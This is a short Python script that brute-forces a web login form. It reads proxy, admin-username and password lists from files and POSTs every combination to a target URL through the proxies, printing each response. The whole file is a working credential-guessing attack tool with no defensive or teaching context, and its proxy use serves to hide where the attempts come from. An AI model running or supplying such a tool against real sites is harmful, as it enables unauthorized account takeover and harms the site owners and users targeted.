# import modules{
    #requests module to make requests with proxies
import requests
import time

# declare variables 
admin_el = []
psd = []
i = 0
proxies = {}
j=0
# URL
a_url = input("Testing URL:" )
with open('proxy-list/http_proxies.txt') as f:
    # read the file line by line
    for line in f:
        # remove any whitespace at the beginning and end of the line
        line = line.strip()
        # add the proxy to the dictionary in the correct format
        proxies["http"] = "http://" + line
        proxies["https"] = "https://" + line
# }

admin_list_file = input("Admin list path: ")
with open(admin_list_file,'r') as admin_list_file :
    for line in admin_list_file:
        admin_el.append(line.strip())
password_list_file = input("Password list path: ")
with open(password_list_file, 'r') as f:
    psd = [line.strip() for line in f]

for admin in admin_el:
    for password in psd:
        params = {
            'user_name': admin,
            'user_pass': password
        }
        print("Trying: {} with password {}".format(admin, password))
        response = requests.post(a_url, params=params, proxies=proxies, allow_redirects=True)
        if response.status_code == 200:
            print('REQUEST-POSTED!\n=== The fetched response is: \n')
            print(response.content)
        elif response.status_code in [301, 302]:
            print('Redirection detected!\n=== The fetched response is: \n')
            print(response.headers['Location'])
        else:
            print('Error while sending request!\n=== Details of Failure ===\n')
            print(response.status_code)
        time.sleep(1)
    
